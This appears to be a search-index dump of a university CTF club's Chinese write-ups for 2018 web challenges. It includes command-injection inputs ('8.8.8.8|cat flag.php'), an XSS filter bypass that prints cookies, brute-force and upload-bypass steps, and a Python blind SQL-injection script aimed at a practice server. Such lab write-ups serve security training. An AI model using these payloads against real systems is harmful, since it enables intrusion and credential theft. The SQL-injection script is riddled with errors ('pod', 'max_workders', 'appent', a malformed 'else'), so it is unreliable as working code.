{"config":{"lang":["en"],"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Introduction \u00b6 \u2003\u2003\u6b22\u8fce\u8bbf\u95ee SCU-CTF \u534f\u4f1a\u7684 Writeup \u5206\u4eab\u5e73\u53f0\uff0c\u672c\u5e73\u53f0\u4e0a\u6240\u5c55\u793a\u7684\u4e3a SCU-CTF \u7ec3\u4e60\u5e73\u53f0\u4e0a\u7684\u76f8\u5173\u9898\u76ee\u7684 Writeup\u3002 \u2003\u2003\u5982\u679c\u5927\u5bb6\u6709\u81ea\u5df1\u7684\u89c1\u89e3\uff0c\u6b22\u8fce\u5728\u7fa4\u5185\u8ba8\u8bba\uff0c\u4e5f\u53ef\u79c1\u6233\u7ba1\u7406\u5458\u63d0\u51fa\u5efa\u8bae\u3002","title":"Introduction"},{"location":"#introduction","text":"\u6b22\u8fce\u8bbf\u95ee SCU-CTF \u534f\u4f1a\u7684 Writeup \u5206\u4eab\u5e73\u53f0\uff0c\u672c\u5e73\u53f0\u4e0a\u6240\u5c55\u793a\u7684\u4e3a SCU-CTF \u7ec3\u4e60\u5e73\u53f0\u4e0a\u7684\u76f8\u5173\u9898\u76ee\u7684 Writeup\u3002 \u2003\u2003\u5982\u679c\u5927\u5bb6\u6709\u81ea\u5df1\u7684\u89c1\u89e3\uff0c\u6b22\u8fce\u5728\u7fa4\u5185\u8ba8\u8bba\uff0c\u4e5f\u53ef\u79c1\u6233\u7ba1\u7406\u5458\u63d0\u51fa\u5efa\u8bae\u3002","title":"Introduction"},{"location":"2018/Web/","text":"Web \u00b6 \u2003\u20032018 \u5e74\u7684 Web \u9898\u77e5\u8bc6\u70b9\u90fd\u6bd4\u8f83\u57fa\u7840\uff0c\u57fa\u672c\u6bcf\u9898\u90fd\u53ea\u6d89\u53ca\u5230\u4e00\u4e2a\u77e5\u8bc6\u70b9\u3002 \u7b7e\u5230 \u00b6 \u8003\u5bdf\u8981\u70b9\uff1a \u6d4f\u89c8\u5668\u5f00\u53d1\u8005\u5de5\u5177\uff08F12\uff09\uff0cJSFuck \u7f16\u7801 \u6253\u5f00\u9898\u76ee\u53d1\u73b0\u662f\u4e00\u4e2a\u7f51\u9875\uff0c\u6709\u4e00\u4e2a\u8f93\u5165\u6846 \u4efb\u610f\u8f93\u5165\u5b57\u7b26\u8fd4\u56de\u201c\u597d\u50cf\u4e0d\u5bf9\u201d\uff0c\u505a Web \u9898\u76ee\u9047\u4e8b\u4e0d\u51b3\u5148 F12 \u770b\u4e00\u4e0b\uff0c\u53d1\u73b0\u6e90\u4ee3\u7801\u91cc\u6709\u4e00\u4e32 JSFuck \u4ee3\u7801\u3002 \u5229\u7528\u5728\u7ebf\u5de5\u5177 JSFuck \u89e3\u7801\u5de5\u5177\u8fdb\u884c\u89e3\u7801\uff0c\u6216\u8005\u590d\u5236 JSFuck \u4ee3\u7801\u5230\u6d4f\u89c8\u5668\u5f00\u53d1\u8005\u5de5\u5177 console \u8fd0\u884c\uff0c\u5373\u53ef\u5f97\u5230 flag\u3002 \u8ba1\u7b97\u5668 \u00b6 \u8003\u5bdf\u8981\u70b9\uff1a \u5199\u811a\u672c\u80fd\u529b \u6253\u5f00\u540e\u9875\u9762\u5982\u4e0b\u56fe \u8981\u6c42\u7b80\u5355\u6765\u8bf4\u5c31\u662f\u56de\u7b54 20 \u9053\u6570\u5b66\u9898\u76ee\uff0c\u6bcf\u9053\u6700\u591a 3s,\u6700\u5c11 1s\uff0c\u591a\u6b21\u5237\u65b0\u540e\u53d1\u73b0\u9898\u76ee\u7684\u957f\u5ea6\uff0c\u8fd0\u7b97\u65b9\u6cd5\u5747\u4e0d\u5b9a\uff0c\u60f3\u5230\u9760\u811a\u672c\u8ba1\u7b97\uff0cF12 \u5ba1\u67e5\u540e\u53d1\u73b0\uff0c\u9898\u76ee\u7684\u5185\u5bb9\u88ab\u5206\u5728\u591a\u4e2a\u5143\u7d20\u4e2d\uff0c\u5982\u679c\u4f7f\u7528\u6b63\u5219\u5339\u914d\u7684\u8bdd\u5339\u914d\u96be\u5ea6\u8f83\u5927\uff0c\u8003\u8651\u7528 webdriver\uff0c\u6309\u7167 xpath \u6765\u67e5\u627e\u5143\u7d20\uff0c\u5bf9\u5176\u8fdb\u884c\u6574\u5408\uff0c\u8ba1\u7b97\u4e0e\u63d0\u4ea4\uff0c\u811a\u672c\u5185\u5bb9\u5982\u4e0b import requests import time import re from selenium import webdriver driver = webdriver . Firefox () driver . get ( \"http://120.78.66.77:81\" ) for j in range ( 1 , 21 ): string = '' i = 1 while driver . find_element_by_xpath ( \"//body/form[1]/div[{}]\" . format ( i )) . text != '=' : string += driver . find_element_by_xpath ( \"//body/form[1]/div[{}]\" . format ( i )) . text i += 1 answer = eval ( string ) driver . find_element_by_xpath ( \"//body/form[1]/input[1]\" ) . send_keys ( answer ) time . sleep ( 1 ) driver . find_element_by_xpath ( \"//body/form[1]/input[2]\" ) . click () Cat? \u00b6 \u8003\u67e5\u8981\u70b9\uff1a \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c \u6253\u5f00\u94fe\u63a5\uff0cF12 \u540e\u770b\u5230\u6ce8\u91ca\u4e2d\u6709\u63d0\u793a \u6839\u636e\u63d0\u793a\u6253\u5f00\uff1a http://120.78.66.77:87/exec.php?view_source \u770b\u5230\u6e90\u7801\u540e\u5206\u6790\u4e00\u4e0b\u53d1\u73b0\u8f93\u5165\u662f\u9650\u5236\u4e86\u957f\u5ea6\u4e0d\u80fd\u8d85\u8fc7 21 \u7684\uff0c\u5e76\u4e14\u5fc5\u987b\u8f93\u5165 ip \u683c\u5f0f\uff0c\u7136\u540e\u60f3\u5230\u547d\u4ee4\u884c\u6ce8\u5165\uff1a command1 && command2 #\u5148\u6267\u884c command1 \u540e\u6267\u884c command2 command1 | command2 #\u53ea\u6267\u884c command2 command1 & command2 #\u5148\u6267\u884c command2 \u540e\u6267\u884c command1 \u5c1d\u8bd5\u8f93\u5165\uff1a 8.8.8.8|ls,\u7ed3\u679c\u5982\u4e0b\uff0c\u6240\u4ee5 flag \u5e94\u8be5\u662f\u5728 flag.php \u4e2d\u7684 \u518d\u5c1d\u8bd5\u8f93\u5165\uff1a8.8.8.8|cat flag.php \u7ed3\u679c\u6ca1\u6709\u4efb\u4f55\u8fd4\u56de\uff0c\u6211\u4eec\u6293\u5305\u770b\u4e00\u4e0b\uff0c\u5728 repeater \u4e2d\u770b\u5230\u8fd4\u56de\u4e86 flag\u3002 \u7b80\u5355\u7684 XSS \u00b6 \u8003\u67e5\u8981\u70b9\uff1a \u7b80\u5355 XSS Payload \u6784\u9020 Hint\uff1a\u4e3a\u5565\u4e0d\u770b\u770b cookie \u5462 Hint\uff1aMarkdown \u517c\u5bb9\u5927\u591a\u6570 html \u8bed\u6cd5\u7684 \u53cd\u5c04\u578b xss\uff0c\u5c31\u662f\u6d4f\u89c8\u5668\u8f93\u5165->\u540e\u53f0\u5904\u7406->\u8fd4\u56de\u6d4f\u89c8\u5668\u663e\u793a\uff0c\u542c\u8bf4 markdown \u517c\u5bb9\u5927\u591a\u6570 html \u8bed\u6cd5\uff0c\u9898\u76ee\u662f xss \u90a3\u5c31\u8bd5\u8bd5\u54af\uff0c\u4f7f\u7528< script>alert(1);< /script>\u9a8c\u8bc1\u4e00\u4e0b xss \u6f0f\u6d1e,\u53d1\u73b0\u56de\u663e\u662f<>alert(1); script \u6d88\u5931\u4e86\u3002\u8bf4\u660e\u8fdb\u4e86\u540e\u53f0\uff0c\u5e76\u4e14\u88ab\u8f6c\u6362\u6210\u4e86 null\u3002\u53cc\u6301 script \u7ed5\u8fc7\u3002 < scscriptript> \u6253\u5370 cookie \u6784\u9020 Payload: < scscriptript>document.write(document.cookie)< /scrscriptipt>\u5f97\u5230 flag \u4e00\u9053\u5165\u95e8\u7684\u4ee3\u7801\u5ba1\u8ba1 \u00b6 \u8003\u67e5\u8981\u70b9\uff1a PHP \u4ee3\u7801\u5ba1\u8ba1 \u5229\u7528 php \u5f31\u7c7b\u578b\u8bed\u8a00\u7684\u5224\u65ad\u6f0f\u6d1e\uff0c\u7528\u54c8\u5e0c\u503c\u5f00\u5934\u662f 0e \u7684\u6784\u9020 payload; \u83b7\u53d6\u542b\u6709 flag \u94fe\u63a5\u7684\u7f51\u9875\uff0c\u70b9\u8fdb\u53bb\u53d1\u73b0\u6ca1\u6709\u8bbf\u95ee\u6743\u9650\u3002\u5c1d\u8bd5\u5404\u79cd\u65b9\u6cd5\u66f4\u6539 http \u5934\u90e8\u5185\u5bb9\uff0c\u6dfb\u52a0 refer,\u66f4\u6539 cookie\u2026\u2026Burpsuit \u6293\u5305\u66f4\u6539 permission \u4e3a nqzva(rot13 \u52a0\u5bc6\u540e\u7684 admin) Burpsuit \u53ef\u4ee5\u770b\u5230\u8fd4\u56de\u4e86\u6587\u4ef6\u7684\u94fe\u63a5\uff0c\u76f4\u63a5\u8bbf\u95ee\u94fe\u63a5\u5e76\u6ca1\u6709\u4e1c\u897f\u3002\u518d\u5c06\u8bf7\u6c42\u653e \u5728 burpsuite \u67e5\u770b\uff0c\u8fd4\u56de too slow\u3002\u8003\u8651\u7528\u811a\u672c\u3001burpsuit \u4e0d\u65ad\u53d1\u5305\u8bf7\u6c42\u3002 Burpsuite\u2014\u2014>Send to Intruder\u2014\u2014>Payload\u2014\u2014>Generate 100 payloads \u2014\u2014>Start attack; \u811a\u672c\u5982\u4e0b import requests r1 = requests . Session () while ( 1 ): r2 = r1 . get ( \"http://120.78.66.77:85/u/18f6dceefd3014a4b73e4b131776afa248ea810c/flag\" ) print ( r2 . text ) \u7136\u540e\u53ef\u4ee5\u5f97\u5230\u7ed3\u679c\u5982\u4e0b\u56fe\u6240\u793a\uff1a \u767b\u5f55\u4e00\u4e0b \u00b6 \u8003\u67e5\u8981\u70b9\uff1a SQL \u6ce8\u5165 \u6253\u5f00\u9898\u76ee\u5730\u5740\uff0c\u53d1\u73b0\u662f\u4e2a\u767b\u5f55\u754c\u9762\uff0c\u5148\u8d70\u6d41\u7a0b\uff0c\u7528\u4ee3\u7897\u5b66\u59d0\u6700\u65b0\u6362\u7684 AWVS10.5 \u626b\u4e00\u626b\u8fd9\u4e2a\u7f51\u7ad9\uff0c\u770b\u770b\u6709\u6ca1\u6709\u6e90\u7801\u6cc4\u6f0f\u6216\u8005\u5176\u4ed6\u53ef\u4ee5\u626b\u5230\u7684\u6f0f\u6d1e\uff0c\u4e00\u822c\u6765\u8bb2\u7528 AWVS \u53ef\u4ee5\u626b\u5230\u4e00\u4e9b\u51fa\u9898\u4eba\u6545\u610f\u7559\u4e0b\u7684\u7ebf\u7d22\uff0c\uff08\u5982 git \u6cc4\u6f0f\uff0csvn \u6cc4\u6f0f\u6216\u8005.bak \u6cc4\u6f0f\u7b49\u7b49\uff09\uff0c\u626b\u63cf\u51fa\u4e86\u51e0\u4e2a\u5217\u76ee\u5f55\u7684\u6f0f\u6d1e\u4f46\u662f\u5e76\u6ca1\u6709\u4ec0\u4e48\u7528\u3002 \u63a5\u7740\u7528 Burp \u6293\u5305\uff0c\u770b\u770b\u670d\u52a1\u5668\u7ed9\u6211\u4eec\u8fd4\u56de\u7684\u5305\u91cc\u9762\u6709\u4ec0\u4e48\u7ebf\u7d22\uff08burp \u7684\u4f7f\u7528\u6559\u7a0b http://www.uml.org.cn/safe/201406135.asp \uff09\u5728\u6d4f\u89c8\u5668\u4e2d\u8bbe\u7f6e\u6210 burp \u4f7f\u7528\u7684\u4ee3\u7406\uff0c\u7136\u540e\u8bbf\u95ee\u767b\u5f55\u9875\u9762\uff0c\u53d1\u73b0\u4e86\u63d0\u793a\u3002\u987a\u4fbf\u4e00\u63d0\uff0c\u5c3d\u7ba1\u8fd9\u9053\u9898\u4e2d\u51fa\u9898\u4eba\u628a\u63d0\u793a\u85cf\u5728\u4e86\u9875\u9762\u6e90\u7801\u4e2d\uff0c\u53ef\u4ee5\u76f4\u63a5\u5728\u6d4f\u89c8\u5668\u91cc\u770b\u5230\uff0c\u5927\u5e08\u5176\u4ed6\u9898\u7ed9\u7684\u63d0\u793a\u6709\u53ef\u80fd\u5728 cookies \u751a\u81f3\u670d\u52a1\u5668\u81ea\u5b9a\u4e49\u7684\u8fd4\u56de\u5934\u91cc\u9762\uff0c\u800c\u8fd9\u4e9b\u4e1c\u897f\u90fd\u80fd\u5728 burp \u7684\u6293\u5305\u4e2d\u770b\u5230\uff0c\u6240\u4ee5\u6211\u4eec\u6700\u597d\u8fd8\u662f\u7528 burp \u6765\u627e hint \u63d0\u793a\u544a\u8bc9\u4e86\u6211\u4eec\u6570\u636e\u5e93\u7684\u4e00\u4e9b\u4fe1\u606f\uff0c\u7ed3\u5408\u9898\u76ee\u53ef\u4ee5\u731c\u5230\u662f\u8981\u6211\u4eec\u901a\u8fc7 SQL \u6ce8\u5165\u6765\u83b7\u53d6\u5bc6\u7801\u3002 \u6d4b\u8bd5\u8fd9\u9053\u9898\u5bf9\u4e0a\u4f20\u6570\u636e\u7684\u9650\u5236\uff0c\u6211\u4eec\u9996\u5148\u53d1\u73b0\u5982\u679c\u6211\u4eec\u63d0\u4ea4\u7684\u6570\u636e\u4e2d\u5904\u51fa\u73b0\u4e86\u5173\u952e\u5b57\uff0c\u670d\u52a1\u5668\u5c31\u4f1a\u8fd4\u56de naive\u3002\u56e0\u6b64\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u670d\u52a1\u5668\u662f\u5426\u8fd4\u56de na\u00efve \u6765\u6d4b\u8bd5\u4e00\u4e2a\u5173\u952e\u5b57\u662f\u5426\u88ab\u7981\u6b62\uff0c\u7ecf\u8fc7\u624b\u52a8\u6d4b\u8bd5\uff08\u5176\u5b9e\u6700\u597d\u81ea\u5df1\u51c6\u5907\u4e00\u4efd\u5b57\u5178\u7528 burp \u6279\u91cf\u6d4b\u8bd5\uff09\uff0c\u6211\u4eec\u53ef\u4ee5\u53d1\u73b0\u88ab\u7981\u6b62\u7684\u5173\u952e\u5b57\u6709\uff1aunion select from where and \u4ee5\u53ca\u7a7a\u683c\u548c\u7a7a\u683c\u7684\u5404\u7c7b\u66ff\u4ee3\uff08%0a %0b /**/\u4e4b\u7c7b\uff09 substr \u8fd8\u6709/*\u3002\u5404\u7c7b\u7ed5\u8fc7\u624b\u6bb5\u5747\u65e0\u6548\uff0c\u5982\u5927\u5c0f\u5199\u66ff\u6362\uff0cURL \u7f16\u7801 \u770b\u4f3c\u65e0\u89e3\u7684\u9898\u76ee\u5728\u6709 hint \u7684\u60c5\u51b5\u4e0b\u6211\u4eec\u4ecd\u65e7\u80fd\u591f\u6784\u9020\u8bed\u53e5\u6765\u7ed5\u8fc7\u5b83\u3002\u5728\u6211\u4eec\u53d1\u52a8 SQL \u6ce8\u5165\u653b\u51fb\u524d\uff0c\u6211\u4eec\u8981\u9996\u5148\u5224\u65ad\u8fd9\u4e2a\u6ce8\u5165\u70b9\u7684\u7c7b\u578b\uff0c\u4e00\u822c\u7684\u6ce8\u5165\u6709 UNION \u6ce8\u5165\uff0c\u62a5\u9519\u6ce8\u5165\uff0c\u5e03\u5c14\u6ce8\u5165\uff0c\u4ee5\u53ca\u65f6\u95f4\u5dee\u6ce8\u5165\uff08\u7c7b\u4f3c DNS \u6ce8\u5165\u7684\u9ed1\u79d1\u6280\u5148\u4e0d\u7ba1\uff09\u3002 \u8fd9\u9053\u9898\u628a Union \u5173\u952e\u5b57\u7ed9\u9650\u5236\u4e86\uff0c\u8fd8\u4e0d\u62a5\u9519.\u56e0\u6b64\u6211\u4eec\u9996\u5148\u8003\u8651\u5e03\u5c14\u6ce8\u5165\u3002\u5e03\u5c14\uff08BOOL) \u8fd9\u4e2a\u542c\u8d77\u4f86\u5f88\u5947\u602a\uff0c\u5176\u5b9e\u8bf4\u767d\u4e86\u5c31\u662f\u6784\u9020\u5224\u65ad\u8bed\u53e5\u8ba9\u670d\u52a1\u5728\u8bed\u53e5\u7ed3\u679c\u4e3a\u771f\u6216\u8005\u4e3a\u5047\u7684\u65f6\u5019 \u8fd4\u518b\u4e0d\u540c\u7ed3\u679c\uff0c\u636e\u6b64\u6765\u83b7\u53d6\u4fe1\u606f\u3002 \u53ef\u4ee5\u53d1\u73b0\u5982\u679c\u7528\u6237\u540d\u8f93\u5165 admin\uff0c\u5bc6\u7801\u4e71\u8f93\uff0c\u4f1a\u63d0\u793a\u6211\u4eec password error,\u4f46\u5982\u679c\u662f\u5176\u5b83\u7528 \u6237\u540d\uff0c\u5b83\u5c31\u4f1a\u63d0\u793a no such user\u3002\u8fd9\u8868\u660e\u53ef\u80fd\u53ef\u4ee5\u5728\u7528\u6237\u540d\u90a3\u91cc\u4e0b\u624b\u6ce8\u5165\u3002 \u6d4b\u8bd5\u53d1\u73b0\u7528\u6237\u540d\u4e3a admin\u2019&&(1)# \u4e3a password error\uff0c\u4e3a admin\u2019&&(0)#\u65f6\u4e3a no such user,\u5e03\u5c14\u6ce8\u5165\u5b9e\u9524\uff01\u8fd9\u4e2a&&\u7684\u610f\u601d\u662f\u548c\uff0c\u53ef\u4ee5\u4ee3\u66ff and\uff0c\u800c#\u662f\u6ce8\u91ca\u7b26\u53f7\u7528\u4e8e\u6ce8\u91ca\u540e\u9762\u7684\u8bed\u53e5\u3002 \u6211\u4eec\u53ef\u4ee5\u5047\u5b9a\u8fd9\u4e2a\u767b\u5f55\u8bed\u53e5\u662f\u8fd9\u6837\u7684 select pwd from table name where uname= \u2019\u4f60\u8f93\u5165\u7684\u2019 \u628a\u521a\u521a\u8f93\u5165\u7684\u4ee3\u8fdb\u53bb\u5c31\u662f select pwd from table_name where uname=\u2019adminl&&(1)#' ,\u5982\u679c\u62ec\u53f7\u5185\u7684\u5185\u5bb9\u4e3a\u771f\uff08\u975e 0)\u5c31\u80fd\u591f\u8fd4\u56de\u7ed3\u679c\uff08password error)\uff0c\u4e0d\u80fd\u7684\u8bdd\u5c31\u65e0\u6cd5\u8fd4\u56de (no such user) \u73b0\u5728\u5f00\u59cb\u5c1d\u8bd5\u628a\u521a\u624d\u62ec\u53f7\u5185\u7684\u5185\u5bb9\u6362\u6210 length(pwd),\u8fd9\u4e2a length \u51fd\u6570\u53ef\u4ee5\u53d6\u4e00\u4e2a\u5b57\u7b26\u4e32\u7684\u957f\u5ea6,\u6574\u4e2a\u8bed\u53e5\u5c31\u6210\u4e86 select pwd from table_name where uname='adminl&&(length(pwd) )#\u2019 \u8fd4\u56de\u7684\u662f password error! \u8fd9\u8bf4\u660e pwd \u771f\u7684\u5b58\u5728\uff0c\u800c\u4e14\u53ef\u8bbf\u95ee\uff0c\u4e8e\u662f\u6211\u4eec\u53ef\u4ee5\u52a0\u4e0a\u5404\u7c7b\u5224\u65ad\u8bed\u53e5\u6765\u5224\u65ad pwd \u7684\u957f\u5ea6 \u4e8e\u662f\u5c31\u75af\u72c2\u6d4b\u8bd5 \u5728\u6d4b\u8bd5\u7684\u65f6\u5019\uff0c\u65b9\u4fbf\u8d77\u89c1.\u53ef\u4ee5\u628a\u6293\u5230\u7684\u767b\u5f55\u5305\u653e\u5728 Burp \u7684 repeater \u4e2d\uff0c\u4f46\u662f\u4e00\u5b9a\u8981\u628a& \u6362\u6210\uff0526,\u5426\u5219\u670d\u52a1\u5668\u4f1a\u628a&\u540e\u9762\u7684\u5f53\u4f5c\u53e6\u4e00\u4e2a\u4e0a\u4f20\u7684\u53c2\u6570\u3002\u53d1\u73b0\u8fd9\u4e2a\u5bc6\u7801\u957f\u5ea6\u4e3a 30 (\u5988\u7684\u771f\u591f\u957f\uff09 \u6211\u4eec\u73b0\u5728\u9700\u8981\u8003\u8651\u5982\u4f55\u8dd1\u51fa\u6570\u636e\u4e2b\uff0c\u6b63\u5e38\u7684\u5e03\u5c14\u6ce8\u5165\u9700\u8981\u7528 substr \u51fd\u6570\u4e00\u4e2a\u4e00\u4e2a\u5730\u53d6\u6570\u636e \uff0c\u4f46\u662f\u6211\u4eec\u7684 substr \u88ab\u7981\u4e86\u600e\u4e48\u529e\u5462\uff1f\u6211\u4eec\u8fd8\u6709 left \u548c right \u51fd\u6570\u53ef\u4ee5\u53d6\u3002\u811a\u672c\u5982\u4e0b\uff1a import requests from concurrent.futures import ThreadPoolExecutor from concurrent import futures url = \"http://120.78.66.77:84/fb69d7b4467e33c71b0153e62f7e2bf0/\" head = { \"Content-Type\" : \"application/x-www-form-unlencoded\" } #\u4e0d\u52a0\u4e0a\u670d\u52a1\u5668\u4e0d\u8ba4 data = \"uname=admin' %26% 26ascii(right(left(pwd,curlen),1))-curascii#&pwd=\" pwd = '_' * 31 def Check ( curlen ): global pwd data = \"uname=admin' %26% 26ascii(right(left(pod,curlen),1))BOOL#&pwd=\" . replace ( \"curlen\" , str ( curlen )) #\u5148\u66ff\u6362\u4f4d\u6570 start = 0 end = 255 while start <= end : #\u6b64\u5904\u4e8c\u5206 mid = ( start + end ) // 2 page = requests . post ( url = url , headers = head , data = data , replace ( \"BOOL\" , \"=\" + str ( mid ))) . text if \"error\" in page : pwd = pwd [: curlen ] + chr ( mid ) + pwd [ curlen + 1 :] print ( pwd [ 1 :]) return chr ( mid ) page = requests . post ( url = url , headers = head , data = data , replace ( \"BOOL\" , \"<\" + str ( mid ))) . text if \"error\" in page : end = mid - 1 else start = mid + 1 with ThreadPoolExecutor ( max_workders = 20 ) as executor : futurn_list = list () for curlen in range ( 1 , 31 ): future = executor . submit ( Check , curlen ) future_list . appent ( future ) print ( \"\u5bc6\u7801\u662f\" + pwd [ 1 :]) \u4e00\u9053\u8239\u7ec6\u7684\u5916\u90e8\u9898\u76ee \u00b6 \u8003\u67e5\u8981\u70b9\uff1a Linux \u5907\u4efd\u6587\u4ef6\uff0c\u8d26\u53f7\u5bc6\u7801\u7206\u7834\uff0cPHP \u6587\u4ef6\u540e\u7f00\u540d\u7ed5\u8fc7 \u5148 F12,\u770b\u5230\u63d0\u793a info.php \u53d1\u73b0 info.php \u88ab\u5220\u9664\uff0c\u770b\u770b\u5907\u4efd\u6587\u4ef6.bak \u67e5\u770b\u6587\u4ef6\uff0c\u6307\u660e\u4e86\u7206\u7834\u7684\u65b9\u5f0f\u548c\u8d26\u6237&\u5bc6\u7801\u96c6\u5408\uff0c\u53ea\u662f\u6709\u70b9\u5927\uff0c\u811a\u672c\u751f\u6210\u7206\u7834\u6587\u4ef6\uff0c\u914d\u7f6e\u5230 burp \u91cc\uff0c\u9759\u9759\u7b49\u5f85\u2026\u2026\u2026\u5927\u6982\u51e0\u5341\u5206\u949f\u5427 \u767b\u5f55\u540e\u8ba9\u4e0a\u4f20 PHP \u6587\u4ef6\uff0c\u7531\u6e90\u7801\u53d1\u73b0\u5176\u5b9e\u53ea\u662f\u4e0a\u4f20\u4e86\u6587\u4ef6\u540d\uff0c\u4f46\u662f\u666e\u901a\u7684 php \u6587\u4ef6\u65e0\u6cd5\u4e0a\u4f20\uff0c\u8fd9\u65f6\u60f3\u5230\u4e86 PHP \u7684\u4e00\u79cd\u522b\u540d\uff1aphps,\u4e00\u79cd\u7279\u6b8a\u7684 php \u6587\u4ef6\uff0c\u5f97\u5230 flag","title":"Web"},{"location":"2018/Web/#web","text":"2018 \u5e74\u7684 Web \u9898\u77e5\u8bc6\u70b9\u90fd\u6bd4\u8f83\u57fa\u7840\uff0c\u57fa\u672c\u6bcf\u9898\u90fd\u53ea\u6d89\u53ca\u5230\u4e00\u4e2a\u77e5\u8bc6\u70b9\u3002","title":"Web"},{"location":"2018/Web/#_1","text":"\u8003\u5bdf\u8981\u70b9\uff1a \u6d4f\u89c8\u5668\u5f00\u53d1\u8005\u5de5\u5177\uff08F12\uff09\uff0cJSFuck \u7f16\u7801 \u6253\u5f00\u9898\u76ee\u53d1\u73b0\u662f\u4e00\u4e2a\u7f51\u9875\uff0c\u6709\u4e00\u4e2a\u8f93\u5165\u6846 \u4efb\u610f\u8f93\u5165\u5b57\u7b26\u8fd4\u56de\u201c\u597d\u50cf\u4e0d\u5bf9\u201d\uff0c\u505a Web \u9898\u76ee\u9047\u4e8b\u4e0d\u51b3\u5148 F12 \u770b\u4e00\u4e0b\uff0c\u53d1\u73b0\u6e90\u4ee3\u7801\u91cc\u6709\u4e00\u4e32 JSFuck \u4ee3\u7801\u3002 \u5229\u7528\u5728\u7ebf\u5de5\u5177 JSFuck \u89e3\u7801\u5de5\u5177\u8fdb\u884c\u89e3\u7801\uff0c\u6216\u8005\u590d\u5236 JSFuck \u4ee3\u7801\u5230\u6d4f\u89c8\u5668\u5f00\u53d1\u8005\u5de5\u5177 console \u8fd0\u884c\uff0c\u5373\u53ef\u5f97\u5230 flag\u3002","title":"\u7b7e\u5230"},{"location":"2018/Web/#_2","text":"\u8003\u5bdf\u8981\u70b9\uff1a \u5199\u811a\u672c\u80fd\u529b \u6253\u5f00\u540e\u9875\u9762\u5982\u4e0b\u56fe \u8981\u6c42\u7b80\u5355\u6765\u8bf4\u5c31\u662f\u56de\u7b54 20 \u9053\u6570\u5b66\u9898\u76ee\uff0c\u6bcf\u9053\u6700\u591a 3s,\u6700\u5c11 1s\uff0c\u591a\u6b21\u5237\u65b0\u540e\u53d1\u73b0\u9898\u76ee\u7684\u957f\u5ea6\uff0c\u8fd0\u7b97\u65b9\u6cd5\u5747\u4e0d\u5b9a\uff0c\u60f3\u5230\u9760\u811a\u672c\u8ba1\u7b97\uff0cF12 \u5ba1\u67e5\u540e\u53d1\u73b0\uff0c\u9898\u76ee\u7684\u5185\u5bb9\u88ab\u5206\u5728\u591a\u4e2a\u5143\u7d20\u4e2d\uff0c\u5982\u679c\u4f7f\u7528\u6b63\u5219\u5339\u914d\u7684\u8bdd\u5339\u914d\u96be\u5ea6\u8f83\u5927\uff0c\u8003\u8651\u7528 webdriver\uff0c\u6309\u7167 xpath \u6765\u67e5\u627e\u5143\u7d20\uff0c\u5bf9\u5176\u8fdb\u884c\u6574\u5408\uff0c\u8ba1\u7b97\u4e0e\u63d0\u4ea4\uff0c\u811a\u672c\u5185\u5bb9\u5982\u4e0b import requests import time import re from selenium import webdriver driver = webdriver . Firefox () driver . get ( \"http://120.78.66.77:81\" ) for j in range ( 1 , 21 ): string = '' i = 1 while driver . find_element_by_xpath ( \"//body/form[1]/div[{}]\" . format ( i )) . text != '=' : string += driver . find_element_by_xpath ( \"//body/form[1]/div[{}]\" . format ( i )) . text i += 1 answer = eval ( string ) driver . find_element_by_xpath ( \"//body/form[1]/input[1]\" ) . send_keys ( answer ) time . sleep ( 1 ) driver . find_element_by_xpath ( \"//body/form[1]/input[2]\" ) . click ()","title":"\u8ba1\u7b97\u5668"},{"location":"2018/Web/#cat","text":"\u8003\u67e5\u8981\u70b9\uff1a \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c \u6253\u5f00\u94fe\u63a5\uff0cF12 \u540e\u770b\u5230\u6ce8\u91ca\u4e2d\u6709\u63d0\u793a \u6839\u636e\u63d0\u793a\u6253\u5f00\uff1a http://120.78.66.77:87/exec.php?view_source \u770b\u5230\u6e90\u7801\u540e\u5206\u6790\u4e00\u4e0b\u53d1\u73b0\u8f93\u5165\u662f\u9650\u5236\u4e86\u957f\u5ea6\u4e0d\u80fd\u8d85\u8fc7 21 \u7684\uff0c\u5e76\u4e14\u5fc5\u987b\u8f93\u5165 ip \u683c\u5f0f\uff0c\u7136\u540e\u60f3\u5230\u547d\u4ee4\u884c\u6ce8\u5165\uff1a command1 && command2 #\u5148\u6267\u884c command1 \u540e\u6267\u884c command2 command1 | command2 #\u53ea\u6267\u884c command2 command1 & command2 #\u5148\u6267\u884c command2 \u540e\u6267\u884c command1 \u5c1d\u8bd5\u8f93\u5165\uff1a 8.8.8.8|ls,\u7ed3\u679c\u5982\u4e0b\uff0c\u6240\u4ee5 flag \u5e94\u8be5\u662f\u5728 flag.php \u4e2d\u7684 \u518d\u5c1d\u8bd5\u8f93\u5165\uff1a8.8.8.8|cat flag.php \u7ed3\u679c\u6ca1\u6709\u4efb\u4f55\u8fd4\u56de\uff0c\u6211\u4eec\u6293\u5305\u770b\u4e00\u4e0b\uff0c\u5728 repeater \u4e2d\u770b\u5230\u8fd4\u56de\u4e86 flag\u3002","title":"Cat?"},{"location":"2018/Web/#xss","text":"\u8003\u67e5\u8981\u70b9\uff1a \u7b80\u5355 XSS Payload \u6784\u9020 Hint\uff1a\u4e3a\u5565\u4e0d\u770b\u770b cookie \u5462 Hint\uff1aMarkdown \u517c\u5bb9\u5927\u591a\u6570 html \u8bed\u6cd5\u7684 \u53cd\u5c04\u578b xss\uff0c\u5c31\u662f\u6d4f\u89c8\u5668\u8f93\u5165->\u540e\u53f0\u5904\u7406->\u8fd4\u56de\u6d4f\u89c8\u5668\u663e\u793a\uff0c\u542c\u8bf4 markdown \u517c\u5bb9\u5927\u591a\u6570 html \u8bed\u6cd5\uff0c\u9898\u76ee\u662f xss \u90a3\u5c31\u8bd5\u8bd5\u54af\uff0c\u4f7f\u7528< script>alert(1);< /script>\u9a8c\u8bc1\u4e00\u4e0b xss \u6f0f\u6d1e,\u53d1\u73b0\u56de\u663e\u662f<>alert(1); script \u6d88\u5931\u4e86\u3002\u8bf4\u660e\u8fdb\u4e86\u540e\u53f0\uff0c\u5e76\u4e14\u88ab\u8f6c\u6362\u6210\u4e86 null\u3002\u53cc\u6301 script \u7ed5\u8fc7\u3002 < scscriptript> \u6253\u5370 cookie \u6784\u9020 Payload: < scscriptript>document.write(document.cookie)< /scrscriptipt>\u5f97\u5230 flag","title":"\u7b80\u5355\u7684 XSS"},{"location":"2018/Web/#_3","text":"\u8003\u67e5\u8981\u70b9\uff1a PHP \u4ee3\u7801\u5ba1\u8ba1 \u5229\u7528 php 